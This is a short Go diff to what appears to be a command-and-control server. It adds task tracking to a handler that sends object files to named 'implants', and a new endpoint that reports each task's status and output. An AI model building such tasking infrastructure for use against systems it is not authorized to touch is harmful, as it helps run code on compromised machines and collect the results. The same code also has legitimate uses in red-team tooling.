@@ -75,11 +75,33 @@ func bofRunHandler(w http.ResponseWriter, r *http.Request) {
 		http.Error(w, "no such implant", http.StatusNotFound)
 		return
 	}
+	implantID := parseUintOr(implantStr, 0)
+	taskID := tasks.Create(implantID)
 	if err := s.Send(serverMsg{Type: "bof", File: fileB64, Args: body.Args}); err != nil {
 		http.Error(w, err.Error(), http.StatusInternalServerError)
 		return
 	}
-	writeJSON(w, http.StatusOK, map[string]string{"status": "sent", "bof": name})
+	writeJSON(w, http.StatusOK, map[string]string{"task_id": taskID, "status": "sent", "bof": name})
+}
+
+// GET /api/tasks/{id} -> {id, implant_id, status, output, created, updated}
+//   status: "running" (not yet produced output) | "completed" | "failed"
+func taskHandler(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodGet {
+		http.Error(w, "GET only", http.StatusMethodNotAllowed)
+		return
+	}
+	id := strings.TrimPrefix(r.URL.Path, "/api/tasks/")
+	if id == "" {
+		http.NotFound(w, r)
+		return
+	}
+	t, ok := tasks.Get(id)
+	if !ok {
+		http.NotFound(w, r)
+		return
+	}
+	writeJSON(w, http.StatusOK, t)
 }
 
 func parseUintOr(s string, def uint64) uint64 {
